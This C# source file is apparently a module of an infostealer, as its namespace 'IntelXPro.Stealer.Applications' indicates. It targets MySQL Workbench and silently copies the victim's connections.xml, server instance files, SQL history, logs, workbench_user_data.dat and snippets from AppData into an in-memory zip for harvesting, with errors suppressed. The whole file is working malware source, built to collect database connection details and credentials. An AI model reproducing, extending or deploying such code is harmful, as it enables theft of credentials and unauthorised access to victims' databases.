using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class MySQLWorkbench : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string workbenchPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MySQL", "Workbench");

            if (!Directory.Exists(workbenchPath))
            {
                return;
            }

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "MySQLWorkbench";

            bool foundData = false;

            foundData |= CollectConnections(workbenchPath, zip, counterApplications);
            foundData |= CollectServerInstances(workbenchPath, zip, counterApplications);
            foundData |= CollectSQLHistory(workbenchPath, zip, counterApplications);
            foundData |= CollectConfiguration(workbenchPath, zip, counterApplications);

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectConnections(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string connectionsFile = Path.Combine(basePath, "connections.xml");
                if (File.Exists(connectionsFile))
                {
                    string zipPath = "Applications\\MySQLWorkbench\\connections.xml";
                    zip.AddFile(zipPath, File.ReadAllBytes(connectionsFile));
                    counterApplications.Files.Add(connectionsFile + " => " + zipPath);
                    foundData = true;
                }

                string serverInstancesFile = Path.Combine(basePath, "server_instances.xml");
                if (File.Exists(serverInstancesFile))
                {
                    string zipPath = "Applications\\MySQLWorkbench\\server_instances.xml";
                    zip.AddFile(zipPath, File.ReadAllBytes(serverInstancesFile));
                    counterApplications.Files.Add(serverInstancesFile + " => " + zipPath);
                    foundData = true;
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectServerInstances(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string serverInstancesPath = Path.Combine(basePath, "server_instances");
                if (Directory.Exists(serverInstancesPath))
                {
                    string[] instanceFiles = Directory.GetFiles(serverInstancesPath, "*.xml", SearchOption.AllDirectories);
                    
                    foreach (string file in instanceFiles)
                    {
                        string relativePath = file.Substring(serverInstancesPath.Length + 1);
                        string zipPath = "Applications\\MySQLWorkbench\\server_instances\\" + relativePath;
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectSQLHistory(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string sqlHistoryPath = Path.Combine(basePath, "sql_history");
                if (Directory.Exists(sqlHistoryPath))
                {
                    string[] historyFiles = Directory.GetFiles(sqlHistoryPath, "*.sql", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in historyFiles.Take(20))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = "Applications\\MySQLWorkbench\\sql_history\\" + fileName;
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }

                string logPath = Path.Combine(basePath, "log");
                if (Directory.Exists(logPath))
                {
                    string[] logFiles = Directory.GetFiles(logPath, "*.log", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in logFiles.Take(5))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = "Applications\\MySQLWorkbench\\log\\" + fileName;
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectConfiguration(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "wb_options.xml",
                    "wb_state.xml",
                    "workbench_user_data.dat"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = "Applications\\MySQLWorkbench\\" + configFile;
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string snippetsPath = Path.Combine(basePath, "snippets");
                if (Directory.Exists(snippetsPath))
                {
                    string[] snippetFiles = Directory.GetFiles(snippetsPath, "*.*", SearchOption.AllDirectories);
                    
                    foreach (string file in snippetFiles)
                    {
                        string relativePath = file.Substring(snippetsPath.Length + 1);
                        string zipPath = "Applications\\MySQLWorkbench\\snippets\\" + relativePath;
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
